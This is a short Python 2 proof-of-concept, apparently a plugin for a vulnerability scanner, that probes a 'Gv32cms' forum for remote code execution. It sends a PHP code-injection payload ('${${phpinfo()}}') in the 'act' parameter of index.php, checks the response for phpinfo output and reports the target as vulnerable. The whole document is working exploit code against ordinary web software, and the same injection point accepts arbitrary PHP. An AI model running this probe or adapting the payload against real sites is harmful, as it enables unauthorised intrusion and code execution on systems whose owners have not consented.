# -*- coding: utf-8 -*-
def exploit(url):
	poc = "http://%s/bbs/index.php?load=forum&act=${${phpinfo()}}"%url
	try:
		ok=fuck.urlget(poc)
		if ok.getcode() == 200:
			str=ok.read()
			tmp=fuck.find("SCRIPT_FILENAME\"]</td><td class=\"v\">(.*)</td",str)
			if len(tmp)>0:
				fuck.report('Gv32cms_CommandExec',"%s"%poc)
				print "TARGET Gv32cms_CommandExec VULNERABLE !"
	except Exception,e:
		print e
exploit(test_url)